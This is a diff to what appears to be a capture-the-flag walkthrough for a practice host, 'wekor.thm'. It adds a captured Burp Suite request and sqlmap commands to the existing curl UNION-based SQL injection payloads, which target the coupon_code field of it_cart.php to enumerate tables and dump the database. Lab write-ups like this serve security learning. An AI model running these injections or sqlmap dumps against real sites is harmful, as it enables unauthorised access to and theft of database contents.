@@ -39,6 +39,42 @@ curl -X POST http://${URL}/it-next/it_cart.php \
 curl -X POST http://${URL}/it-next/it_cart.php \
   -d "coupon_code=' UNION SELECT 1, 2, GROUP_CONCAT(table_name) FROM information_schema.tables -- -" \ -d "apply_coupon=Apply Coupon" | grep -i code
 ```
+Capture payload with burpsuite
+```bash
+POST /it-next/it_cart.php HTTP/1.1
+
+Host: wekor.thm
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 43
+
+Origin: http://wekor.thm
+
+Connection: keep-alive
+
+Referer: http://wekor.thm/it-next/it_cart.php
+
+Upgrade-Insecure-Requests: 1
+
+Priority: u=0, i
+
+
+
+coupon_code=12345&apply_coupon=Apply+Coupon
+```
+Use SQLMAP with payload
+```bash
+sqlmap -r coupon.req --level 5 --risk=3
+```
 Use SQLMAP to determine if the database can be pull
 ```bash
 sqlmap -u http://${URL}/it-next/it_cart.php --forms "coupon_code=%27+or+1+%3D+1+Limit+0%2C+1+--+-&apply_coupon=Apply+Coupon" --dump
